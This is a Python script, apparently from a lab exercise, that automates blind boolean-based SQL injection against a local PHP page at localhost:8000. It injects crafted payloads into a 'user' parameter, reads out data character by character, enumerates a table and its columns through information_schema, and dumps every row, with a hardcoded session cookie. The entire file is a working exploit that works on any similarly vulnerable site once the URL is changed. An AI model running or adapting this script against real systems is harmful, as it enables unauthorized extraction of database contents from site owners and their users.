import requests
import string

url = "http://localhost:8000/blindsqli.php"
true_indicator = "In wonderland right now"

# I got that from the site and then F12
my_cookies = {
    'PHPSESSID': '14a6773ab6444749b4c46e19a6bdd25c'
}

# options of charachters: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-
alphabet = string.ascii_letters + string.digits + "_- "

def check_connection():
    res = requests.get(url, params={'user': "alice' AND 1=1 #"}, cookies=my_cookies)
    if true_indicator in res.text:
        print("Sanity check passed! The server is responding.\n")
        return True
    else:
        print("Sanity check failed!\n")
        return False

def extract_data(query, max_length=70):
    extracted = ""
    for i in range(1, max_length + 1):
        found_char = False
        
        for ascii_val in range(32, 127):
            condition = f"ASCII(SUBSTRING(({query}),{i},1))={ascii_val}"
            payload = f"alice' AND {condition} #"
            
            response = requests.get(url, params={'user': payload}, cookies=my_cookies)
            
            if true_indicator in response.text:
                char = chr(ascii_val)
                extracted += char
                print(char, end='', flush=True) 
                found_char = True
                break
        
        if not found_char:
            break
            
    print() 
    return extracted

if __name__ == "__main__":
    print("Starting Full Autonomous Blind SQLi Extraction \n")
    
    if check_connection():
        print("Phase 0: Extracting table name from 'secure' database...")

        table_query = "SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1"
        print(" Table Name: ", end='')
        table_name = extract_data(table_query)
        
        if not table_name:
            print("Failed to find the table name. Exiting.")
            exit()
            
        print(f"    Found table: {table_name}\n")


        print("-" * 50)
        print("Phase 1: Enumerating columns...")
        columns = []
        offset = 0
        while True:
            print(f"    Extracting column {offset + 1}: ", end='')
            col_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {offset}"
            col_name = extract_data(col_query)
            
            if not col_name: 
                print("     No more columns found.")
                break
                
            columns.append(col_name)
            offset += 1
            
        print(f"    Found {len(columns)} columns: {columns}\n")
        
        print("-" * 50)
        print("Phase 2: Extracting row count...")
        count_query = f"SELECT count(*) FROM secure.`{table_name}`"
        print("   Row count: ", end='')
        row_count_str = extract_data(count_query)
        
        if row_count_str.isdigit():
            row_count = int(row_count_str)
            
            print("-" * 50)
            print("Phase 3: Dumping table contents...")
            
            for row_idx in range(row_count):
                print(f"\n--- Row {row_idx + 1} ---")
                for col_name in columns:
                    print(f"    {col_name}: ", end='')
                    data_query = f"SELECT {col_name} FROM secure.`{table_name}` LIMIT 1 OFFSET {row_idx}"
                    extract_data(data_query)
        else:
            print("Failed to get row count.")